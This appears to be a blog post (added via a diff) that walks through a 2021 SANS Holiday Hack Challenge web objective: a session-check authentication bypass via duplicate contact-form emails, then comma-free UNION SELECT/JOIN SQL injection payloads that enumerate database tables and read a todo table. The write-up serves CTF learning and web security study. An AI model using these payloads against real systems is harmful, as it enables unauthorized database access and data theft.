@@ -1,0 +1,341 @@
+---
+title:  "Objective 12: KringleCon Orientation - 2021 SANS Holiday Hack Challenge"
+date:   "2022-01-05 00:12:00 -0800"
+categories: HolidayHack2021
+header:
+ teaser: /assets/images/HolidayHack2021/admin_page.png
+---
+
+In this one, we do some more web app pen testing, but this time we get the source code from the start!
+
+[Play the 2021 SANS Holiday Hack Challenge](https://2021.kringlecon.com/invite)
+
+## Objective
+> Investigate [Frost Tower's website for security issues](https://staging.jackfrosttower.com/). [This source code will be useful in your analysis](https://download.holidayhackchallenge.com/2021/frosttower-web.zip). In Jack Frost's TODO list, what job position does Jack plan to offer Santa?
+
+## Hints
+- We should be looking for a SQL injection vulnerability
+- When you have the source code, API documentation becomes [tremendously](https://www.npmjs.com/package/express-session) [valuable](https://github.com/mysqljs/mysql).
+
+## Setting up a Local Instance
+This will help us understand what's going on with the database as we try different attacks.
+
+### Prep the javascript
+1. Install all the necessary npm packages from npm using `npm install <PACKAGE>`. The list is at the top of the `server.js` file.
+	- Don't forget to install the `ejs` and `mysql` packages too.
+2. The `dateformat` package will throw a warning when we try to run `server.js`. As a workaround, we can comment out the `require` line in `server.js`, go to `./node_modules/dateformat/lib/`, open `dateformat.js`, and copy and paste its contents directly into `server.js` somewhere near the top above the actual start of the code. Then all we have to do is remove the keywords `export default` and `export` from that copy/pasted content.
+3. Change `modconnection.js` to match this (compensating for a local database instead of a remote one):
+
+```js
+var mysql = require('mysql');
+
+function createCon(){
+    var connection  = mysql.createPool({
+        connectionLimit: 4000,
+        queueLimit: 3000,
+        host: '127.0.0.1',
+        user: 'encontact',
+        password: '',
+        database: 'encontact',
+        port: 3306,
+        insecureAuth: true
+    });
+
+    return connection;
+}
+
+module.exports = createCon;
+```
+4. Remove the `ReplaceAnyMatchingWords()` calls in these lines in `server.js`, since we're not given that function in the code:
+
+```js
+app.post('/postcontact', function(req, res, next){
+    var fullname = xss( ReplaceAnyMatchingWords(req.body.fullname) );
+    var email = xss( ReplaceAnyMatchingWords( req.body.email) );
+    var phone = xss( ReplaceAnyMatchingWords( req.body.phone) );
+    var country = xss( ReplaceAnyMatchingWords( req.body.country ) );
+	...
+```
+
+When edited, it'll look like this:
+```js
+app.post('/postcontact', function(req, res, next){
+    var fullname = xss( req.body.fullname );
+    var email = xss( req.body.email );
+    var phone = xss( req.body.phone );
+    var country = xss( req.body.country );
+	...
+```
+
+My best guess is that this is essentially a blocklist for certain words. Not great that we don't have it, since it could be important, but at least it'll let us run the post request and see what's going on in the database. We just have to be cognizant that if we run an attack on the `/postcontact` page, we may get different results in the live version of the site.
+
+### Set Up the Database
+There are some extra steps in setting up the database that aren't in `encontact_db.sql`, so we'll set up our own `custom_encontact_db.sql` file with some extra lines at the top to create the right user.
+
+```sql
+DROP USER IF EXISTS 'encontact'@'localhost';
+FLUSH PRIVILEGES;
+CREATE USER 'encontact'@'localhost' IDENTIFIED BY '';
+FLUSH PRIVILEGES;
+
+DROP DATABASE IF EXISTS encontact;
+CREATE DATABASE encontact;
+
+GRANT ALL PRIVILEGES ON encontact.*
+TO 'encontact'@'localhost';
+FLUSH PRIVILEGES;
+
+USE `encontact`;
+
+/*Table structure for table `uniquecontact` */
+...
+```
+
+Now if we run the following command, it'll set up the database for us:
+```bash
+cat custom_encontact_db.sql | sudo mysql -u root
+```
+
+We can check that it did it properly by running `sudo mysql -u root` and then:
+
+```sql
+USE encontact
+SHOW TABLES;
+```
+
+We should get this output:
+```
++---------------------+
+| Tables_in_encontact |
++---------------------+
+| emails              |
+| uniquecontact       |
+| users               |
++---------------------+
+```
+
+**Notes:**
+- If you don't already have some kind of mysql server installed on your box you can install mariadb (the package is called `mariadb-server` in kali) and then run `mysql_secure_installation` to initialize it.
+- I'm using kali linux here, so the mysql server is set up by default with a root user with no password, provided that you use sudo to call mysql. Your environment may vary.
+- You might have to run `systemctl start mysql` to start the database service if your mysql server isn't already started.
+
+### Running the Web Server
+Now that everything's all set up, we can just run the `server.js` file
+```bash
+node server.js
+```
+
+and it should spit out something like this:
+```
+(node:8782) Warning: Accessing non-existent property 'prototype' of module exports inside circular dependency
+(Use `node --trace-warnings ...` to show where the warning was created)
+Server listening on port 1155
+```
+
+I'm just going to ignore that warning unless it becomes an issue.
+
+Now if we go to http://localhost:1155, we should see the website.
+
+### Cleanup
+To clean up when we're done, just terminate the process running server.js and run the following in mysql:
+```sql
+DROP USER IF EXISTS 'encontact'@'localhost';
+FLUSH PRIVILEGES;
+DROP DATABASE IF EXISTS encontact;
+```
+
+Then, in the terminal run this command (only if you had to run `system start mysql`)
+```bash
+systemctl stop mysql.service
+```
+
+
+## Authentication Bypass
+Looking at the source code, we can see that the only check that's done to get to some of the restricted pages is that your session has to have a `uniqueID` value set. Here's an example from the `/dashboard` page:
+
+```js
+app.get('/dashboard', function(req, res, next){
+
+    session = req.session;
+
+    if (session.uniqueID){ //<- THIS IS THE CHECK ////////////////////////////
+
+        tempCont.query("SELECT * from uniquecontact order by date_created desc", function(error, rows, fields){
+
+            if (error) {
+                return res.sendStatus(500);
+            }
+
+            ...
+
+            res.render('dashboard',
+                {
+                    ...
+                }
+            );
+        });
+
+    } else {
+        res.redirect("/login");
+    }
+});
+```
+
+So you can see from this that as long as `session.uniqueID` isn't empty, it will render the dashboard page. This raises a question though: can we get the server to give our session a `uniqueID` without authenticating?
+
+Searching through the code, we can see that all of the instances where a `uniqueID` value is set are locked behind other requirements that we don't have (like already having a `uniqueID` value set or having valid credentials). All except for one, which is on the `/postcontact` page.
+
+```js
+app.post('/postcontact', function(req, res, next){
+    var fullname = xss( req.body.fullname );
+    var email = xss( req.body.email );
+    ...
+
+    tempCont.query("SELECT * from uniquecontact where email="+tempCont.escape(email), function(error, rows, fields){
+
+        if (error) {
+            console.log(error);
+            return res.sendStatus(500);
+        }
+
+        var rowlength = rows.length;
+        if (rowlength >= "1"){
+            session = req.session;
+            session.uniqueID = email; //<- THIS IS WHERE THE VALUE IS SET ////////////////////////////
+            req.flash('info', 'Email Already Exists');
+            res.redirect("/contact");
+
+        } else {
+            ...
+        }
+
+    });
+});
+```
+
+If the email submitted in the contact form is the same as an existing email, it sets the session's `uniqueID` to the email address that was sent along with the POST request. For our purposes, it doesn't really matter what the `uniqueID` value is set to, just that it is set to *something*.
+
+Triggering this is actually pretty easy. By navigating to https://staging.jackfrosttower.com/contact and submitting two contact forms with the same email address (or one form with an email address that's already in the database), it should set the `uniqueID` for us. You can tell that you did this correctly, because it will say "Email Already Exists" in a green box at the top of the contact form after the second submission.
+
+![Email Already Exists](/assets/images/HolidayHack2021/email_already_exists.png)
+
+Now we can just navigate to https://staging.jackfrosttower.com/dashboard and it should let us in.
+
+![Admin Panel](/assets/images/HolidayHack2021/admin_page.png)
+
+## SQL Injection
+Looking through all of the SQL queries used in the source code in `server.js`, we can see that if there are commas in the  `/detail/:id` URL the associated query is manually constructed and not properly escaped before being passed to the mysql hanlder, making it vulnerable to a SQL injection attack.
+
+```js
+app.get('/detail/:id', function(req, res, next) {
+    session = req.session;
+    var reqparam = req.params['id'];
+    var query = "SELECT * FROM uniquecontact WHERE id=";
+
+    if (session.uniqueID){
+
+        try {
+            if (reqparam.indexOf(',') > 0){
+                var ids = reqparam.split(',');
+                reqparam = "0";
+                for (var i=0; i<ids.length; i++){
+                    query += tempCont.escape(m.raw(ids[i]));
+                    query += " OR id="
+                }
+                query += "?";
+            }else{
+                query = "SELECT * FROM uniquecontact WHERE id=?"
+            }
+        } catch (error) {
+            console.log(error);
+            return res.sendStatus(500);
+        }
+
+        tempCont.query(query, reqparam, function(error, rows, fields){
+            ...
+        });
+    }else{
+        res.redirect("/login");
+    }
+});
+```
+
+Since we have a local instance running, we can add `console.log(this.sql);` to the code above the `if (error) {` line so that it prints the query to the console and we can better understand how it's constructing the query.
+
+For example, if we go to [http://localhost:1155/detail/1,2](http://localhost:1155/detail/1,2) this is the query that gets made:
+```sql
+SELECT * FROM uniquecontact WHERE id=1 OR id=2 OR id='0'
+```
+
+You can even see here that the 1 and 2 aren't properly escaped like the `'0'` is. The "OR id='0'" will always be added to the end. Not a big deal though, we can always just comment it out using `-- -`  at the end of the URL.
+
+Now the challenge becomes getting around the fact that the input is comma-separated. This means we have to craft an injection that doesn't have any commas. We can use `UNION SELECT` to add things to the query, but we can't use commas, or else they'll get separated out.
+
+Hacktricks has a section of a page on this: [Bypassing comma restrictions in SQL injections](https://book.hacktricks.xyz/pentesting-web/sql-injection#no-commas-bypass).
+
+From that link, we can see that we can use `JOIN` instead of commas to build our response.
+
+A simple injection would look like this, since there are 7 columns in the `uniquecontact` table and the app is selecting all columns from it.
+```sql
+UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- -
+```
+
+If we go to this URL
+```
+http://localhost:1155/detail/0,0 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- -
+```
+the query that gets executed is this
+```sql
+SELECT * FROM uniquecontact WHERE id=0 OR id=0 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- - OR id='0'
+```
+and we get back a page that looks like this
+
+![SQL Injection](/assets/images/HolidayHack2021/sql_injection.png)
+
+Success! Now we just have to get it to do something interesting. PentestMonkey has a pretty good [mysql injection cheat sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) that we can reference.
+
+We can get the table names with this query:
+```sql
+UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name FROM information_schema.tables)b JOIN (SELECT table_schema FROM information_schema.tables)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- -
+```
+```
+https://staging.jackfrosttower.com/detail/0,0 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name FROM information_schema.tables)b JOIN (SELECT table_schema FROM information_schema.tables)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- -
+```
+
+The titles will be the table names and the first bullet of each card will be the database (a.k.a. `table_schema`) the table is in.
+
+![Table Names](/assets/images/HolidayHack2021/table_names.png)
+
+If we scroll down, we can see that there is a table called `todo` in the `encontact` database.
+
+To list the column names of that table:
+
+```sql
+UNION SELECT * FROM (SELECT 1)a JOIN (SELECT column_name FROM information_schema.columns WHERE table_name='todo')b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- -
+```
+```
+https://staging.jackfrosttower.com/detail/0,0 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT column_name FROM information_schema.columns WHERE table_name='todo')b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- -
+```
+
+The titles of each card will now be the column names.
+
+Then all we have to do is query that table directly:
+```sql
+UNION SELECT * FROM (SELECT 1)a JOIN (SELECT note FROM todo)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- -
+```
+```
+https://staging.jackfrosttower.com/detail/0,0 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT note FROM todo)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- -
+```
+
+Alternatively, in case the information_schema.columns table isn't working, we could brute-force the number of columns by doing `SELECT * FROM todo` and then removing the `JOIN` statements one at a time. This is the query that ended up working:
+```sql
+UNION SELECT * FROM (SELECT 1)a JOIN (SELECT * FROM todo)b JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- -
+```
+```
+https://staging.jackfrosttower.com/detail/0,0 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT * FROM todo)b JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- -
+```
+
+The last item on the TODO list is:
+>With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him
+
+**Answer:** clerk
